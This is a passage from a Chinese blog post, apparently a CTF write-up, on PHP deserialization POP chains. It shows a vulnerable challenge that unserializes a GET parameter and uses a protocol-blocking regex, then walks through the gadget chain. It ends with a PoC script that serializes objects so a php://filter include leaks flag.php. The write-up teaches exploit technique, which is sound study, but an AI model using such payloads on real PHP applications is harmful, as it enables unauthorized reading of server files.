+        <span style="color:#719e07">return</span> <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>str<span style="color:#719e07">-&gt;</span>source;
+    }
+
+    <span style="color:#719e07">public</span> <span style="color:#719e07">function</span> __wakeup(){
+        <span style="color:#719e07">if</span>(preg_match(<span style="color:#2aa198">&#34;/gopher|http|file|ftp|https|dict|\.\./i&#34;</span>, <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>source)) {
+            <span style="color:#719e07">echo</span> <span style="color:#2aa198">&#34;hacker&#34;</span>;
+            <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>source <span style="color:#719e07">=</span> <span style="color:#2aa198">&#34;index.php&#34;</span>;
+        }
+    }
+}
+
+<span style="color:#719e07">class</span> <span style="color:#268bd2">Test</span>{
+    <span style="color:#719e07">public</span> <span style="color:#268bd2">$p</span>;
+    <span style="color:#719e07">public</span> <span style="color:#719e07">function</span> __construct(){
+        <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>p <span style="color:#719e07">=</span> <span style="color:#719e07">array</span>();
+    }
+
+    <span style="color:#719e07">public</span> <span style="color:#719e07">function</span> __get(<span style="color:#268bd2">$key</span>){
+        <span style="color:#268bd2">$function</span> <span style="color:#719e07">=</span> <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>p;
+        <span style="color:#719e07">return</span> <span style="color:#268bd2">$function</span>();
+    }
+}
+
+<span style="color:#719e07">if</span>(isset(<span style="color:#268bd2">$_GET</span>[<span style="color:#2aa198">&#39;pop&#39;</span>])){
+    <span style="color:#719e07">@</span>unserialize(<span style="color:#268bd2">$_GET</span>[<span style="color:#2aa198">&#39;pop&#39;</span>]);
+}
+<span style="color:#719e07">else</span>{
+    <span style="color:#268bd2">$a</span><span style="color:#719e07">=</span><span style="color:#719e07">new</span> Show;
+    highlight_file(<span style="color:#cb4b16">__FILE__</span>);
+}
+</code></pre></div><p>以上代码在不传输pop参数时,正常的执行流程</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$a = new Show -&gt; __construct -&gt; $this-&gt;source = $file = index.php -&gt; echo $this-&gt;source -&gt; highlight_file(__FILE__)
+</code></pre></div><p>可以看到正常执行的流程只走了类Show的__construct
+如果get个pop参数过去,就会执行unserialize(),从而调用到类Show中的__toString和__wakeup,在根据传输的内容进行匹配</p>
+<p>在这的代码中,唯一能让我们读取到flag.php的只有类Modifier中的include()
+想要利用到include(),就得如下操作</p>
+<ol>
+<li>实例化Show类,当使用到unserialize()时,就会调用__wakeup()进行匹配,符合条件就直接GG,所以这里需要到php伪协议</li>
+<li>这时我们要让这个伪协议变成我们可控,可以看到类Show中存在个__toString,触发条件就是把类当成字符串来使用,这时就得调用到类Test中的__get(),把$this-&gt;str设置为类Test的实例化对象,因为类Test不存在该属性,就会自动调用到__get()</li>
+<li>最后再把Modifier实例化给$this-&gt;p,就可以达到整个利用过程</li>
+</ol>
+<p>完整POP链</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">Show.__construct() -&gt; Show.__wakeup() -&gt; Show.__toString() -&gt; Test.__get() -&gt; Modifier.__invuke() -&gt; Modifier.append()
+</code></pre></div><p>POC如下</p>
+<div class="highlight"><pre style="color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#719e07">&lt;?</span>php
+
+<span style="color:#719e07">class</span> <span style="color:#268bd2">Modifier</span> {
+    <span style="color:#719e07">protected</span>  <span style="color:#268bd2">$var</span> <span style="color:#719e07">=</span> <span style="color:#2aa198">&#39;php://filter/read=convert.base64-encode/resource=flag.php&#39;</span>;
+}
+
+<span style="color:#719e07">class</span> <span style="color:#268bd2">Show</span>{
+    <span style="color:#719e07">public</span> <span style="color:#268bd2">$source</span>;
+    <span style="color:#719e07">public</span> <span style="color:#268bd2">$str</span>;
+    <span style="color:#719e07">public</span> <span style="color:#719e07">function</span> __construct(<span style="color:#268bd2">$file</span>){
+        <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>source <span style="color:#719e07">=</span> <span style="color:#268bd2">$file</span>;
+    }
+    <span style="color:#719e07">public</span> <span style="color:#719e07">function</span> __toString(){
+        <span style="color:#719e07">return</span> <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>str<span style="color:#719e07">-&gt;</span>source;
+    }
+
+}
+
+<span style="color:#719e07">class</span> <span style="color:#268bd2">Test</span>{
+    <span style="color:#719e07">public</span> <span style="color:#268bd2">$p</span>;
+    <span style="color:#719e07">public</span> <span style="color:#719e07">function</span> __construct(){
+        <span style="color:#268bd2">$this</span><span style="color:#719e07">-&gt;</span>p <span style="color:#719e07">=</span> <span style="color:#719e07">new</span> Modifier();
+    }
+}
+
+<span style="color:#268bd2">$a</span> <span style="color:#719e07">=</span> <span style="color:#719e07">new</span> Show;
+<span style="color:#268bd2">$a</span><span style="color:#719e07">-&gt;</span>str <span style="color:#719e07">=</span> <span style="color:#719e07">new</span> Test;
+<span style="color:#268bd2">$b</span> <span style="color:#719e07">=</span> <span style="color:#719e07">new</span> Show(<span style="color:#268bd2">$a</span>);
+<span style="color:#719e07">echo</span> urlencode(serialize(<span style="color:#268bd2">$b</span>));
+
+<span style="color:#719e07">?&gt;</span>
+</code></pre></div><h4 id="参考">参考</h4>
+<p><a href="https://xz.aliyun.com/t/9234">https://xz.aliyun.com/t/9234</a>
+<a href="https://ctf.ieki.xyz/library/php/serialize.html">https://ctf.ieki.xyz/library/php/serialize.html</a>
+<a href="https://www.gem-love.com/ctf/2184.html#Ezpop">https://www.gem-love.com/ctf/2184.html#Ezpop</a>
+<a href="https://www.anquanke.com/post/id/86452">https://www.anquanke.com/post/id/86452</a>
+<a href="https://forum.90sec.com/t/topic/331">https://forum.90sec.com/t/topic/331</a>
+<a href="https://paper.seebug.org/680/">https://paper.seebug.org/680/</a>
+<a href="https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://chybeta.github.io/2017/06/17/%E6%B5%85%E8%B0%88php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</a></p>
+
+		</div>
+
+		<div class="post-tags">
+			
+				
+					<nav class="nav tags">
+							<ul class="flat">
+								
+								<li><a href="/tags/php">php</a></li>
+								
+							</ul>
+					</nav>
+				
+			
+		</div>
+		</div>
+	<div class="footer wrapper">
+	<nav class="nav">
+		<div> © Copyright notice |  <a href="https://github.com/godbless7">lprvep</a></div>
+	</nav>
+</div>
+
+
+
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
+	ga('create', 'UA-123-45', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+<script async src='https://www.google-analytics.com/analytics.js'></script>
+
+<script>feather.replace()</script>
+</body>
+</html>
